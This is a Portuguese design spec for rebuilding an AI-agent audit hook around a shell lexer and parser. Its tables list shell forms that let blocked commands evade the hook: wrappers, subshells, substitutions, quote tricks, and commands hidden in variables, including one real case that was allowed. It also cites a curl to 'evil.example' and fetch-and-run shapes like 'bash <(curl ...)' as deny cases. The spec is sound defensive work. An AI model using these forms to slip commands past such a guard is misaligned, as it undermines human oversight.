# audit-shell-lexer - lexer e parser de shell para as posições de comando, falhando fechado

- **Date:** 2026-11-13
- **Status:** Implemented
- **Source:** [2026-11-13-audit-shell-lexer.md](../../backlog/refactor/2026-11-13-audit-shell-lexer.md) (refactor sem plan; não há `plan.md` nesta pasta). Junta as entradas já fundidas nela: [segment split quote-blind](../../backlog/refactor/2026-11-13-audit-segment-split-quote-blind.md), [strip_prefixes wrappers](../../backlog/refactor/2026-11-13-audit-strip-prefixes-wrappers.md) e [nvim shell exec unclassified](../../backlog/refactor/2026-11-13-audit-nvim-shell-exec-unclassified.md), mais um item de [watchdog robustness notes](../../backlog/refactor/2026-11-13-audit-watchdog-robustness-notes.md) (ver Background, "O que entra e o que fica fora")
- **Implementation log:** [log.md](log.md) (criado pelo `/implement` na primeira task)

## Summary

O hook `agent-audit` acha as palavras de comando de um Bash com três heurísticas sobrepostas: um split por regex que não vê aspas (`SEGMENT_SPLIT`), o `shlex` com duas listas de fallback e uma janela solta para atribuições (`LOOSE_VALUE_TOKENS`), e um scanner próprio de heredoc. Cada revisão de segurança achou uma forma que escapa entre elas. Esta spec troca as três por **um lexer e parser escritos à mão** para um subconjunto POSIX/bash definido, que passam a ser a única fonte das palavras de comando. Quatro garantias:

1. **Uma fonte, com gramática.** O texto vira uma árvore (listas, pipelines, compostos, comandos simples, palavras com suas partes, redirecionamentos, heredocs). O que fica fora do subconjunto, ou não fecha, é nível B (`unclassified_command`), nunca um palpite.
2. **Toda posição de comando é vista.** `&`, subshell, grupos, `if`/`for`/`while`/`case`, `!`, substituições `$(...)`, crases e `<(...)` em qualquer lugar, wrappers com seus flags (`sudo -u`, `env A=1`, `nice -n`, `xargs`, `watch`, `time -p`, `stdbuf`, `ionice`, `mise exec -c`), binários com caminho, argumentos que executam código (`bash -c`, `eval`, `trap`, formas de shell do nvim) e variáveis cujo valor está no próprio comando (`T="docker compose ..."; zsh -c "$T down"`). A recursão usa o mesmo parser, com profundidade limitada.
3. **Aspas e heredocs exatos.** Separadores, comentários e corpos entre aspas deixam de virar comandos. Um corpo de heredoc é dado, código de outra linguagem ou código de shell conforme o comando que o recebe, e as substituições de um corpo sem aspas no delimitador são analisadas. Fecha o caso HIGH `A="x y z w v" docker restart api # "` sem a exceção de nível A.
4. **Custo linear e medido.** Uma passada, orçamento global de caracteres lidos, teto de aninhamento e de profundidade de recursão; o parser fica num módulo próprio, carregado com bytecode em cache, para não somar cerca de 10 ms de compilação a cada chamada do hook.

| Camada | Arquivos | Mudança |
|---|---|---|
| Parser (novo) | `.claude/hooks/agent_audit_shell.py` | lexer e parser puros (stdlib, sem I/O): `parse(text, budget) -> Script`, tipos da árvore, `iter_sites`, erros `ShellSyntaxError`, `NestingTooDeep`, `BudgetExceeded` |
| Hook | `.claude/hooks/agent-audit.py` | carrega o módulo por caminho (falha vira `classifier_error`); `analyze_command` percorre a árvore; `command_readings` sobre palavras; tabela de wrappers; normalização do nome do programa; argumentos que executam código; propagação de valores; heredoc sobre a árvore; saem `SEGMENT_SPLIT`, `shlex`, `LOOSE_VALUE_TOKENS`, `_scan_heredocs` e os motivos `shlex_fallback` e `loose_assignment_truncated` |
| Métricas | `.claude/hooks/agent-metrics.py` | `LEVEL_A_REASONS` com `dynamic_command` (os motivos antigos ficam, para registros antigos); rótulos de `unclassified_command` e `parse_uncertain` |
| Config | `.claude/hooks/agent-audit.json`, `.claude/settings.json` | sem mudança: os motivos novos ficam nas categorias que já existem |
| Testes | `.claude/hooks/tests/` | módulos novos `test_shell_lexer.py`, `test_shell_properties.py`, `test_command_positions.py`; casos novos e alterados (com motivo) em `test_classify.py`, `test_uncertainty.py`, `test_heredoc.py`, `test_hook_process.py`, `test_bounded_io.py`, `test_agent_metrics.py`; `_support.py` copia o módulo novo |
| Docs (fim, `docs-writer`) | `.claude/README.md`, `.claude/agent-workflow.md` (13.6, 13.8, 14.2), `CLAUDE.md` da raiz (Test suites) | needs_docs |

Sem serviço, API, banco, feature flag nem migração.

*Adendo 2026-11-14 (2):* o classificador (leituras, wrappers, código, valores, heredoc, `_classify_segment`) saiu de `agent-audit.py` para um segundo módulo irmão, `.claude/hooks/agent_audit_classify.py`, carregado pelo mesmo mecanismo por caminho; ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A13.

## Background

### Modelo de ameaça

O mesmo da [audit-hook-hardening](../audit-hook-hardening/spec.md#modelo-de-ameaça): o hook é uma guarda de workflow para agents cooperativos que erram, não uma fronteira contra um adversário. Esta spec fecha as formas de shell que fazem um comando bloqueado passar sem ser reconhecido, e define com precisão o que o parser não modela, que é registrado ou negado, nunca permitido em silêncio por engano do parser.

**O shell real é o zsh.** `$SHELL` é `/usr/bin/zsh` e o Claude Code guarda snapshots `~/.claude/shell-snapshots/snapshot-zsh-*.sh`; segundo uma análise não oficial do código do Claude Code, ele usa `CLAUDE_CODE_SHELL` e depois `$SHELL`, aceitando só bash ou zsh ([openedclaude, cap. 6](https://openedclaude.github.io/claude-reviews-claude/chapters/06-bash-engine), [issue 24573](https://github.com/anthropics/claude-code/issues/24573)). Conferido nesta máquina, só com `echo`:

| Sonda | bash | zsh |
|---|---|---|
| `A[0]=x echo ran` | erro na atribuição e **roda** o `echo` | erro e não roda |
| `=echo ran` | `command not found` | roda `/usr/bin/echo` (expansão `=`) |
| `echo first` + nova linha + `echo "` | imprime `first`, depois erro de sintaxe | erro, nada roda (lê o `-c` inteiro antes) |
| `for i (1) echo ran` | erro de sintaxe | roda (laço curto do zsh) |

Por isso a gramática é um subconjunto em que bash e zsh concordam. O que só um dos dois aceita e muda posições de comando é rejeitado (nível B) ou normalizado (o `=` do zsh, o subscrito do bash).

### Classes de falha aberta hoje

Conferido no HEAD `eee112a` com sondas só de leitura (módulo carregado no processo):

| # | Classe | Exemplo, resultado hoje | Fecha com |
|---|---|---|---|
| L1 | Posições de comando | `true & docker restart x`, `(docker restart x)`, `{ docker restart x; }`, `if/for/while/case`, `! docker restart x`: `(['other'], [])` | S1-S10 |
| L2 | Substituições | `x=$(docker restart x)`, `echo $(docker restart x)`, crases, `<(...)`: `other` | S5, S6 |
| L3 | Wrappers e caminhos | `sudo -u root docker restart x`, `env FOO=1 ...`, `nice -n 5 git push`, `/usr/bin/docker restart x`, `~/.local/bin/mise x -- ...`: `other` | N1-N6 |
| L4 | Código em argumentos | `bash -c 'docker restart x'`, `eval "..."`, nvim `exe "!..."`, `system()`, `:terminal`: `other` | X1-X8 |
| L5 | Aspas e comentários | `A="x y z w v" docker restart api # "`: `other` (registrado como `loose_assignment_truncated`, nível A). Ao contrário, `echo "a` + nova linha + `docker restart x"` é **negado** (falso positivo: o texto está entre aspas) | S2, S3, S4 |
| L6 | Corpo de heredoc sem aspas com substituição | `cat <<EOF` + `$(docker restart x)` + `EOF`: `other`, o corpo é removido como dado, mas o shell executa a substituição (achado novo desta spec) | HD2 |
| L7 | Atribuição com subscrito | `A[0]=x docker restart x`: o bash roda o docker; `ENV_ASSIGN` não reconhece `A[0]=`, a cabeça lida é `A[0]=x`, `other` (pelo código) | S8 |
| L8 | Comando dentro de variável | `T="docker compose -p dnstest -f ..."; zsh -c "$T down -v"`: **caso real** no corpus, permitido | V1-V4, X1 |
| L9 | Expansão `=` do zsh | `=docker restart x` roda o docker no zsh; cabeça `=docker`, `other` (pelo código) | N2 |
| L10 | Gate do `shlex_fallback` | `A="x y z w v" curl https://evil.example # "`: as duas listas erram igual, nenhum motivo, nenhum `external_request` | S3 (sem fallback) |

### Dados de uso (só leitura)

**Corpus.** O `cmd` das métricas é truncado em 300 caracteres (927 dos 2.387 comandos distintos, 39%), então as medidas usam os comandos completos das transcrições locais (`~/.claude/projects/**/*.jsonl`, entradas `tool_use` do Bash): **12.262 comandos distintos**, 46 acima de `MAX_COMMAND_LEN`, mediana de 262 caracteres. Nada sai da máquina e nada entra no repo; os scripts ficam no scratchpad.

| Medida | Resultado |
|---|---|
| Classificador atual, `analyze_command` por comando | mediana 0,47 ms, p95 3,1 ms, p99 9,1 ms, máximo 18,4 ms |
| Motivos atuais no corpus | `loose_assignment_truncated` 712, `shlex_fallback` 622, `deny_token_unmatched` 105, `prefix_readings` 6 |
| Protótipo de lexer (só léxico, descartável, scratchpad) | **0 erro léxico** nos 12.220 comandos abaixo do teto; mediana 0,11 ms, p95 0,90 ms, p99 3,6 ms, máximo 10,7 ms |
| Corpos de heredoc | 2.882: 1.873 para intérprete de outra linguagem (`python3` 1.861, `python` 12), 1.013 para dado (`cat`, `tee`, `git commit -F -`), 15 outros (`docker` 6, `$PY` 5, `sh` 3, `bash` 1) |
| Corpos que não fecham como shell | 316: 164 de intérprete de outra linguagem, 152 de dado, **0** dos outros |
| Argumentos de código | `bash -c` 38 (3 com variável), `sh -c` 15 (1), `zsh -c` 17 (9), `eval` 1 (1) |
| Nomes de programa dinâmicos (`$X ...`) | cerca de 333; 254 com a variável atribuída no próprio comando; até 54 sem atribuição (estimativa por regex, teto superior); 25 com substituição na cabeça |
| Flags que hoje vêm só de corpos de heredoc | 67, quase todas falsos positivos: corpos de `cat >> doc.md <<'EOF'` com crases (o `_UNMODELED` desliga a remoção) davam `git_commit`; corpos Python que editam markdown davam `docker_lifecycle` |
| Compilação do hook | 27 ms para 1.984 linhas (1,37 ms por 100 linhas); carregar o mesmo código de bytecode em cache: 0,57 ms |
| Suite `claude-hooks` | 462 testes, 6,8 s de parede (`ForkedSuite`) |

Conclusões: um parser estrito no nível de cima não nega trabalho real (0 erro léxico); corpos Python não podem ser lidos como shell (164 não fecham); ler corpos de dado com aspas no delimitador como dado puro remove falsos positivos reais; e o parser precisa resolver variáveis atribuídas no próprio comando, ou nega laços legítimos (`for c in ...; do zsh -c "$c"`) e deixa passar `$T down -v`.

### O que entra e o que fica fora

| Entrada | Decisão | Motivo |
|---|---|---|
| [audit-shell-lexer](../../backlog/refactor/2026-11-13-audit-shell-lexer.md) | **entra** (fonte) | L1-L10 |
| [segment split quote-blind](../../backlog/refactor/2026-11-13-audit-segment-split-quote-blind.md) | **entra** (fundida) | S1-S4 |
| [strip_prefixes wrappers](../../backlog/refactor/2026-11-13-audit-strip-prefixes-wrappers.md) | **entra** (fundida) | N1-N6, inclusive `mise exec -c` e caminhos |
| [nvim shell exec unclassified](../../backlog/refactor/2026-11-13-audit-nvim-shell-exec-unclassified.md) | **entra** (fundida) | X6 |
| [watchdog robustness notes](../../backlog/refactor/2026-11-13-audit-watchdog-robustness-notes.md) | **entra em parte** | só o texto de `WHY["parse_uncertain"]`, que esta spec reescreve de qualquer jeito (motivos novos). SIGCHLD, margem do `waitpid` e o `run_tags` de análise falha ficam na entrada: são do watchdog, independentes do parser e pequenos o bastante para dispensar spec |
| [hook launcher performance](../../backlog/refactor/2026-11-13-audit-hook-launcher-performance.md) | fica fora, logo depois (Open questions 4) | o parser vai num módulo carregado com bytecode em cache (Design 7), então acrescenta cerca de 0,6 ms, não 10 ms, e não depende do lançador. O lançador muda o layout do hook e o `settings.json`, decisão própria; o mecanismo de import por caminho definido aqui é a base dele |
| [hooks tests suite slow](../../backlog/refactor/2026-11-13-hooks-tests-suite-slow.md) | fica fora | esta spec acrescenta testes e mantém o orçamento da hardening (no máximo 8,5 s, Task 7; revisado para 12 s em A29); a meta de menos de 5 s continua na entrada |
| [interactive app guard](../../backlog/refactor/2026-11-13-audit-interactive-app-guard.md) | fica fora | decisão do usuário (2026-11-13): esperar a métrica 14.2. Com o parser, a guarda vira uma linha numa tabela de cabeças |
| [bash writes unaudited](../../backlog/refactor/2026-11-13-audit-bash-writes-unaudited.md) | fica fora | é outro controle, com decisão de produto pendente (detecção best-effort ou outro mecanismo). A árvore guarda os redirecionamentos (os heredocs precisam deles), o que torna essa spec mais barata; nenhuma regra de escrita entra aqui |

## Design

### 1. Princípio e regras

**Princípio (inalterado da hardening, agora com fonte única).** Incerteza tem dois níveis. **Nível A**: as leituras possíveis são poucas e conhecidas; todas são classificadas e unidas, e o motivo é registrado (`parse_uncertain`, categoria `audit`). **Nível B**: as leituras não podem ser enumeradas, o texto não pertence ao subconjunto, ou a análise falhou; o comando é negado com `unclassified_command` e o motivo é registrado. Nenhum caminho termina em allow silencioso. O que muda: o nível A deixa de existir para "o tokenizador não entendeu" (o `shlex_fallback` e a janela solta somem). O parser entende ou nega.

| # | Regra |
|---|---|
| S1 | O comando inteiro (até `MAX_COMMAND_LEN`, inalterado) é lido por `agent_audit_shell.parse`, segundo a gramática da seção 2. É a única fonte de palavras de comando: nenhum outro código divide texto de shell |
| S2 | Aspas simples, duplas, `$'...'`, `$"..."` e a barra invertida seguem as regras do bash e do zsh (seção 2.1). Separadores, `#`, `$` e quebras de linha entre aspas são texto |
| S3 | Um texto que não fecha (aspas, substituição, expansão, composto, heredoc sem delimitador) ou que tem um token fora da gramática é erro de sintaxe: nível B, motivo `lex_error`, e nada desse texto é classificado. Vale para o comando, para strings de código (X1-X8) e para corpos de heredoc lidos como shell (HD4). Não há leitura tolerante |
| S4 | `#` no início de uma palavra abre um comentário até o fim da linha; dentro de palavra ou entre aspas é texto |
| S5 | Substituições `$(...)`, crases, `<(...)`, `>(...)` e as de dentro de `${...}`, `$((...))`, `$[...]`, `[[ ... ]]` e de corpos de heredoc sem aspas são scripts aninhados, analisados como comandos onde estiverem |
| S6 | Toda posição de comando da gramática conta: início do texto, depois de `;`, `&`, `&&`, `\|\|`, `\|`, `\|&`, nova linha, `(`, `{`, palavras reservadas (`then`, `do`, `else`, `elif`, `!`, `time`), padrões de `case` e corpos de função |
| S7 | Aninhamento sintático (compostos, grupos, substituições) acima de `MAX_NESTING` (32): nível B, motivo `nesting_depth` |
| S8 | Palavra de atribuição, só na posição de atribuição e sem aspas no nome: `NAME=`, `NAME+=`, `NAME[...]=`, `NAME[...]+=`; o valor pode ter espaços entre aspas e qualquer expansão. Atribuições nunca são o comando |
| S9 | Formas só do zsh que mudam posições (`for i (...)`, `repeat` em forma de bloco, `foreach`, `always`, funções anônimas `() { }`, qualificadores de glob `*(.)`, `=(...)`, `&!`, `&\|`, `{ cmd }` sem `;`) não pertencem à gramática: nível B (`lex_error`). Exceções normalizadas em N2 e N4 |
| S10 | O texto lido em todas as recursões (substituições de crase, strings de código, corpos, valores propagados) é descontado de um orçamento `MAX_LEX_CHARS` (`8 * MAX_COMMAND_LEN`); estourou: nível B, motivo `analysis_budget` |
| N1 | Cada comando simples dá um conjunto de leituras (`command_readings`, mesma busca por posições da hardening, U1-U2) sobre as **palavras** do parser, não sobre tokens do `shlex`. `MAX_READINGS` (8) e o motivo `readings_cap` (nível B) não mudam |
| N2 | Nome do programa: uma palavra com `/` cujo último componente está em `KNOWN_HEADS` vira esse componente (`/usr/bin/docker`, `~/.local/bin/mise`, `./.luarocks/bin/busted`); um `=` inicial sem `/` depois (expansão do zsh) é removido. `KNOWN_HEADS` é a união dos nomes que as tabelas do hook usam (classificação, wrappers, código, sinks), calculada, não mantida à mão. `./mvnw` continua `./mvnw` |
| N3 | Wrappers da tabela da seção 4.2: cada um com a gramática dos próprios flags; `--` encerra os flags; um flag desconhecido dá duas leituras (com e sem valor), como o `timeout` faz hoje (nível A, `prefix_readings`) |
| N4 | Prefixos do zsh `noglob`, `nocorrect`, `-` e `repeat N` (um valor) são wrappers |
| N5 | Wrappers com flags que encerram sem comando (`sudo -l`, `sudo -e`, `sudo -K`, `sudo -V`, `command -v`, `command -V`, `ionice -p`) não dão leitura de comando |
| N6 | Um nome de programa que é uma expansão sem valor conhecido (V1) ou tem glob (`*`, `?`, `[`) é dinâmico: nível A, motivo `dynamic_command`, só quando a leitura é única; o canário (U7 da hardening) continua olhando os tokens seguintes |
| X1 | Argumentos que executam código (tabela da seção 4.3) são analisados com `analyze_command(texto, profundidade + 1)`, e as categorias e flags se unem às do comando de fora |
| X2 | Profundidade de recursão de código (strings de código, corpos de heredoc lidos como shell, formas do nvim) acima de `MAX_CODE_DEPTH` (3, a semântica do antigo `NVIM_MAX_DEPTH`) com código presente: nível B, motivo `nested_shell_depth` (nome mantido) |
| X3 | String de código com uma expansão sem valor conhecido numa posição de comando do texto de dentro (`bash -c "$X"`, `eval "$cmd"`), ou feita de uma substituição (`bash -c "$(curl ...)"`), ou com a string de troca do `xargs -I`: nível B, motivo `dynamic_code`. Expansões em posição de argumento (`sh -c ": > $F"`) são aceitas |
| X4 | Leitor de shell (`bash`, `sh`, `zsh`, `dash`, `ksh`, `mksh`, `ash`, `source /dev/stdin`, `. /dev/stdin`) sem `-c` e sem arquivo de script, num estágio de pipeline que não é o primeiro: nível B, motivo `piped_shell`. Com `<<<` ou heredoc, o texto é a string de código (X1 ou HD4) |
| X5 | Leitor de shell com `<(...)` como arquivo de script (`bash <(curl ...)`, `source <(cmd)`): nível B, `dynamic_code` |
| X6 | nvim: em `-c`, `--cmd` e `+cmd`, além do `!cmd` atual, `:terminal cmd`, `exe[cute] "!..."` e as chamadas `system`, `systemlist`, `jobstart`, `termopen`, `vim.system`, `vim.fn.*` dessas, `os.execute`, `io.popen`. Argumento literal simples (string, ou lista/tabela de strings literais): é a string de código. Qualquer outra forma: nível B, motivo `nvim_shell_exec` |
| X7 | Código de outras linguagens (`python -c`, `node -e`, `lua -e`, corpos para esses intérpretes) não é analisado: o hook nunca modelou semântica de Python e uma linha de shell num programa Python é erro de sintaxe do Python |
| V1 | Valores conhecidos de uma variável no texto analisado: atribuições com valor (`N=v`, `export`/`declare`/`typeset`/`local`/`readonly N=v`, elementos de `N=(a b)`) e as palavras de `for N in w...`. Qualquer outra fonte no mesmo texto (`N=$(...)`, `read N`, `N+=`, `for N in $(...)`, `getopts`, `mapfile`, `printf -v`), ou nenhuma atribuição (ambiente, `$1`, `$@`), torna a variável **desconhecida** |
| V2 | Os valores são usados só em posição de nome de programa e dentro de strings de código (onde o shell de fora expande antes do de dentro). Nunca em argumentos de wrappers (a regra do `timeout "$T"` fica igual) |
| V3 | A análise é insensível ao fluxo: todos os valores de todas as atribuições do texto valem (união). Os valores herdados descem para as strings de código e corpos aninhados |
| V4 | Mais de `MAX_VALUE_CANDIDATES` (16) combinações numa palavra: a palavra é desconhecida (N6 ou X3) |
| HD1 | Os heredocs são lidos pelo parser (seção 2.3), com a semântica do bash: corpo depois da próxima nova linha fora de aspas, linha a linha até o delimitador, `<<-` tira tabs, delimitador entre aspas desliga expansões, corpo sem terminador vai até o fim (aceito) |
| HD2 | Corpo com delimitador **sem aspas**: as expansões do corpo (`$(...)`, crases, `${...}`, `$((...))`) são lidas como dentro de aspas duplas e os scripts delas analisados como comandos, qualquer que seja quem recebe o corpo. Fecha L6 |
| HD3 | Corpo de **dado**: as regras atuais de sink sobre a árvore (seção 5): `cat`/`tee` no nível de cima e fora de pipeline, `git commit -F -`, `gh ... -F -`, `$(cat <<EOF)` sozinho como valor de `git commit -m` ou de opção de mensagem do `gh`; prefixo limpo (H2 da hardening); desqualificadores de script inteiro mantidos |
| HD4 | Corpo para intérprete de outra linguagem (`python`, `python3`, `pythonX.Y`, `node`, `ruby`, `perl`, `lua`, `luajit`, `php`), lido como programa ou como stdin: não é shell (X7). Qualquer outro receptor: o corpo é um script de shell, analisado com o mesmo parser em profundidade + 1; erro de sintaxe nele é nível B (`lex_error`) |
| HD5 | Corpo mantido porque o prefixo não é limpo, com alguma leitura de cabeça `cat`, `tee`, `git` ou `gh`: motivo `heredoc_unclean_prefix` (nível A, inalterado) |
| HD6 | Mais de `MAX_HEREDOC_OPENERS` (32) heredocs num comando simples: nenhum corpo dele é dado (inalterado) |
| U1 | Motivos de nível A: `prefix_readings`, `heredoc_unclean_prefix`, `deny_token_unmatched` (canário), `dynamic_command` (novo) |
| U2 | Motivos de nível B: `readings_cap`, `nested_shell_depth`, `classifier_error`, `analysis_crash` (mantidos); `lex_error`, `nesting_depth`, `analysis_budget`, `dynamic_code`, `piped_shell`, `nvim_shell_exec` (novos) |
| U3 | Saem `shlex_fallback` e `loose_assignment_truncated`: o hook não os produz mais. O relatório de métricas continua rotulando os dois, para registros antigos |
| U4 | Nível B num texto: categorias `["unclassified"]` desse texto, flag `unclassified_command`; os outros textos do mesmo comando (outras substituições, outros comandos) continuam classificados, exceto em `lex_error` no texto de cima, que nega o comando inteiro sem classificar nada |
| P1 | Tempo linear no tamanho da entrada: uma passada por texto, sem regex com retrocesso sobre texto sem limite; o trabalho total é limitado por `MAX_LEX_CHARS`, `MAX_NESTING`, `MAX_CODE_DEPTH`, `MAX_READINGS` e `MAX_VALUE_CANDIDATES` (seção 7) |
| P2 | Os dois módulos irmãos não fazem I/O: nenhuma leitura ou escrita de arquivo, nenhum processo, nenhuma chamada de código dinâmico. O parser (`agent_audit_shell.py`) importa só `re` (e `__future__`) e não guarda estado global mutável. O classificador (`agent_audit_classify.py`) importa só `re`, `functools`, `collections`, `__future__` e o parser, e pode ter tabelas no nível do módulo (dicts e sets, só leitura por convenção) e caches `functools.lru_cache` de funções puras. Nenhum dos dois importa o hook *(revisado pelo [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A13, com a restrição de A4)* |

*Adendo 2026-11-14:* HD3 revisado: `cat`/`tee` com redirecionamento de saída próprio dentro de corpo de função ou de grupo `{ }` fora de pipeline também é dado; ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2), A1. Restrição nova: o hook não importa `typing` (vale também para o módulo, que já cumpre); ver A4.

*Adendo 2026-11-14 (2):* a rodada de correções da revisão estende S2, S5, S9 e S10 (A5, A9), N6 (A6, A7), X1, X3 e X4 (A8, A9), V1-V3 (A7), HD3 e HD4 (A10) e reescreve P2 (A13); ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão).

*Adendo 2026-11-14 (3):* a rodada final estende N1 (formas do docker acima do teto são `readings_cap`, A14), N6 (operadores de parâmetro e brace expansion irresolúvel no nome de programa, A16 e A18), X3 (PS4 só nas palavras de shell, subscritos por indireção e `-v`, A19 e A23), HD3 e HD4 (nomes de receptor religados, escapes SQL, funções que repassam, A15, A20 e A24) e P2 (BIO11 sem `typing`, A26); ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### 2. Gramática do subconjunto

#### 2.1 Léxico

| Item | Regra |
|---|---|
| Entrada | `str` de até `MAX_COMMAND_LEN` caracteres; `\0` é erro (`lex_error`) |
| Brancos | espaço e tab separam palavras. Nova linha é operador. `\` seguido de nova linha é removido (continuação), fora de aspas simples, inclusive dentro de aspas duplas |
| Comentário | S4 |
| Operadores | o mais longo vence: `&&` `\|\|` `;;&` `;;` `;&` `\|&` `&>>` `&>` `>>` `<<<` `<<-` `<<` `<>` `>\|` `<&` `>&` `<` `>` `;` `&` `\|` `(` `)` e nova linha |
| Número de fd | palavra só de dígitos colada a `<` ou `>`; `{nome}` colado a um redirecionamento é fd nomeado |
| Palavra | sequência máxima de caracteres que não são branco nem operador, com as partes abaixo. O texto da palavra (`Word.text`) é o texto sem aspas, com as expansões na forma de origem (`$T`, `${X:-a}`, `$(cmd)`), igual ao que o `shlex` dava nos casos comuns |
| `'...'` | literal, sem escape |
| `$'...'` | literal com escapes de barra (`\'` não fecha) |
| `"..."` e `$"..."` | dentro, `\` escapa `$`, `` ` ``, `"`, `\` e nova linha; `$` e crase abrem expansões |
| `\x` | escapa o caractere seguinte |
| `$nome`, `$1`, `$@`, `$#`, `$?`, `$$`, `$!`, `$-`, `$0` | expansão de parâmetro simples |
| `${...}` | chaves balanceadas, com aspas e expansões aninhadas reconhecidas; o conteúdo não é interpretado (operadores, flags do zsh); só as substituições de dentro são scripts |
| `$(...)` | substituição de comando: o **parser** lê um script aninhado até o `)` que não pertence a ele, de modo que `$(case x in a) y;; esac)` fecha certo |
| `` `...` `` | até a próxima crase sem escape; o conteúdo, sem os escapes `\\`, `` \` `` e `\$`, é um script aninhado (S10 conta o texto) |
| `$((...))`, `$[...]` | aritmética: parênteses (ou colchetes) balanceados, com `$(`, crase e `${` reconhecidos e lidos; o resto não é interpretado. `$((` é sempre aritmética (a volta do bash para subshell não é modelada: se não fecha como aritmética, `lex_error`) |
| `<(...)`, `>(...)` | em qualquer lugar de uma palavra sem aspas (`A=<(x) cmd`, `a<(x)b`) e nos operandos de `[[ ]]` (não no operando de `=~`): substituição de processo, script aninhado *(revisado pelo [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A5; o texto original dizia "no início de palavra", e o bash e o zsh aceitam a forma dentro da palavra)* |
| Atribuição | S8; e `NAME=(...)` / `NAME+=(...)`, na posição de atribuição ou como argumento de `declare`, `typeset`, `local`, `export`, `readonly`: lista de palavras até o `)` (novas linhas permitidas) |
| Palavras reservadas | reconhecidas só sem aspas e na posição de comando: `if then elif else fi do done case esac while until for in select function time ! { } [[ ]] coproc`. `in` e `do` também depois do nome de `for`/`select`/`case`. `foreach`, `always`: erro (S9) |

*Adendo 2026-11-14 (2):* `$'...'` passa a ser decodificado como no bash (o que não decodifica com certeza é dinâmico), `$=NAME`, `$~NAME` e `$^NAME` do zsh são expansões, `repeat N {` é erro (S9), e uma nova linha consumida dentro de `[[ ]]` ou de uma lista de array lê os corpos de heredoc pendentes; ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A5.

*Adendo 2026-11-14 (3):* `\cX` em `$'...'` segue o bash (`toupper(X) & 0x1f`, `\c?` é DEL; resultado NUL é dinâmico); ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final), A21.

#### 2.2 Sintaxe (EBNF)

```
script        ::= linebreak [ list { sep linebreak list } [ sep ] ] linebreak
sep           ::= ';' | '&' | NEWLINE
linebreak     ::= { NEWLINE }
list          ::= pipeline { ( '&&' | '||' ) linebreak pipeline }
pipeline      ::= [ 'time' [ '-p' ] ] [ '!' ] command { ( '|' | '|&' ) linebreak command }
command       ::= simple | compound { redirect } | function_def
                | 'coproc' [ NAME ] ( compound { redirect } | simple )
simple        ::= { assignment | redirect } [ word { word | redirect } ]       (não vazio)
compound      ::= '(' script ')' | '{' script '}'                               ('}' só depois de sep)
                | 'if' script 'then' script { 'elif' script 'then' script } [ 'else' script ] 'fi'
                | ( 'while' | 'until' ) script 'do' script 'done'
                | ( 'for' | 'select' ) NAME [ linebreak 'in' { word } ] sep linebreak 'do' script 'done'
                | 'for' '((' ARITH '))' [ sep ] linebreak 'do' script 'done'
                | 'case' word linebreak 'in' linebreak { case_item } 'esac'
                | '((' ARITH '))'
                | '[[' COND ']]'
case_item     ::= [ '(' ] word { '|' word } ')' script [ ';;' | ';&' | ';;&' ] linebreak
function_def  ::= NAME '(' ')' linebreak compound { redirect }
                | 'function' NAME [ '(' ')' ] linebreak compound { redirect }
redirect      ::= [ IO_NUMBER | '{' NAME '}' ] ( redir_op word | heredoc_op DELIM | '<<<' word )
redir_op      ::= '<' | '>' | '>>' | '<>' | '>|' | '<&' | '>&' | '&>' | '&>>'
heredoc_op    ::= '<<' | '<<-'
```

- Depois de um composto só vêm redirecionamentos, um separador, `&&`/`||`/`|` ou o fim do texto de fora; uma palavra é erro (`(sh -s) cat` é erro no bash e no zsh).
- `ARITH` e `COND` são lidos de forma opaca: até o `))` (parênteses balanceados) ou até a palavra `]]`. Dentro de `[[ ]]`, `(`, `)`, `|`, `<`, `>`, `&` e `!` são texto da palavra, e o operando de `=~` vai até o próximo branco fora de parênteses e aspas. Só as substituições de dentro são scripts.
- O bash e o zsh exigem `;` ou nova linha antes do `}` de um grupo; `{ cmd }` cai em S9.

#### 2.3 Heredoc

1. `<<` ou `<<-` registra um heredoc pendente no nível de script atual: brancos opcionais, palavra delimitadora (remoção de aspas; `quoted` quando houver aspas ou barra; `\` + nova linha dentro dela é continuação). Sem palavra: `lex_error`.
2. Na próxima nova linha **operador** desse nível (fora de aspas; dentro de `$(...)` é a nova linha de dentro), os corpos pendentes são lidos em ordem, linha a linha, até a linha igual ao delimitador (com `<<-`, depois de tirar tabs do início). O `\r` é um caractere comum (o delimitador `EOF` + `\r` só termina numa linha `EOF` + `\r`), como no bash e no zsh.
3. Fim do texto com corpos pendentes: corpos vazios ou até o fim, `terminated = false`, aceito (o bash avisa e roda).
4. Delimitador sem aspas: o corpo é varrido no modo de aspas duplas sem `"` especial (HD2); as partes de expansão ficam em `Heredoc.expansions`.

#### 2.4 O que o parser não interpreta

| Fora do subconjunto | Tratamento |
|---|---|
| Semântica de aritmética, inclusive a avaliação recursiva do conteúdo de variáveis (`x='a[$(cmd)]'; echo $((x))`) | não modelada; só as substituições escritas no texto são vistas (limite documentado) |
| Glob e brace expansion (`*.md`, `{a,b}`) | texto da palavra; em nome de programa, N6 |
| Operadores de expansão de parâmetro (`${x/a/b}`, `${!x}`, `${x:-v}`, flags do zsh) | a palavra é dinâmica; só as substituições de dentro são scripts |
| Extglob (`@(...)`, `!(...)`) e qualificadores de glob do zsh | o `(` encerra a palavra; erro de sintaxe, nível B |
| Aliases e funções do snapshot do usuário (inclusive aliases globais do zsh) | invisíveis ao hook (limite documentado) |
| Código em arquivos (`bash script.sh`, `source arquivo`, `make`, `npm run`) e código remoto (`ssh host cmd`, `docker exec`, `kubectl exec`) | não analisados, como hoje; o heredoc para `ssh`/`kubectl ... sh` continua lido como shell (HD4) |
| Código de outras linguagens | X7 |
| Formas do zsh e do bash fora da seção 2.2 | S9, nível B |

